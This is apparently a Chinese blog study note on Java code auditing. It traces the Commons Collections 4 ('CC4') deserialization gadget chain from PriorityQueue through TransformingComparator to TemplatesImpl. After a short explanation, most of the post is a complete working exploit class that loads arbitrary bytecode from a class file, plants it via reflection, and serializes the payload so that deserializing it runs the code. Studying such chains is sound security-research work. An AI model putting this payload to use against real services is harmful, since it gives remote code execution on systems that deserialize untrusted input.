---
title: cc4
date: 2026-08-04 16:23:42
categories:
  - java代码审计
tags:
  - Java
  - 反序列化
  - Commons Collections
---

进行 find usages，在 `TransformingComparator` 这个类中的 `compare()` 方法调用了 `transform()` 方法。而 `compare()` 这个方法也是我们比较喜欢的这种，因为它非常常见。

![image-20260804153231225](/images/java-code-audit/05-cc4/20260804153240473.png)

这就是一条新的链子了，我们继续往前找，发现是 `PriorityQueue` 这个类中的 `siftDownUsingComparator()` 方法调用了之前的 `compare()` 方法。

![image-20260804153630874](/images/java-code-audit/05-cc4/20260804153630955.png)

![img](/images/java-code-audit/05-cc4/20260804154653325.png)

下一步是 `TransformingComparator` 类的 `compare()` 方法的调用，因为它的可序列化的，所以我们或许可以通过反射修改其调用 `compare()` 方法的值。

- 这里 `compare()` 要求我们传入两个对象？这里我尝试失败了，发现 `transformingComparator.compare()` 如何传参都无法达到弹计算器的效果。说明不应该是在这里弹计算器，应该是下一步的 `PriorityQueue.siftUpUsingComparator()` 来执行。

![image-20260804160501384](/images/java-code-audit/05-cc4/20260804160501463.png)

![image-20260804160551147](/images/java-code-audit/05-cc4/20260804160551263.png)

需要让size等于2才能执行我们的sifedown

Size 就是 PriorityQueue 这个队列的长度，简单理解，就是数组的长度。现在我们这个数组的长度为 0，0 - 1 = -1，所以会直接跳出循环，不能弹计算器。

完整exp

```java
package com.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.Transformer;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class cc4 {
        public static void main(String[] args) throws Exception{
            TemplatesImpl templates = new TemplatesImpl();
            Class templatesClass = templates.getClass();
            Field nameField = templatesClass.getDeclaredField("_name");
            nameField.setAccessible(true);
            nameField.set(templates,"roxci");

            Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
            bytecodesField.setAccessible(true);
            byte[] evil = Files.readAllBytes(Paths.get("E://Calc.class"));
            byte[][] codes = {evil};
            bytecodesField.set(templates,codes);

//        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
//        tfactoryField.setAccessible(true);
//        tfactoryField.set(templates, new TransformerFactoryImpl());
//        templates.newTransformer();
            InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},
                    new Object[]{templates});
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(TrAXFilter.class), // 构造 setValue 的可控参数
                    instantiateTransformer
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
            //  instantiateTransformer.transform(TrAXFilter.class);

            TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
            PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
            priorityQueue.add(1);
            priorityQueue.add(2);

            Class c = transformingComparator.getClass();
            Field transformingField = c.getDeclaredField("transformer");
            transformingField.setAccessible(true);
            transformingField.set(transformingComparator, chainedTransformer);

            serialize(priorityQueue);
            unserialize("ser.bin");
        }
        public static void serialize(Object obj) throws IOException {
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
            oos.writeObject(obj);
        }
        public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
            Object obj = ois.readObject();
            return obj;
        }
    }
```

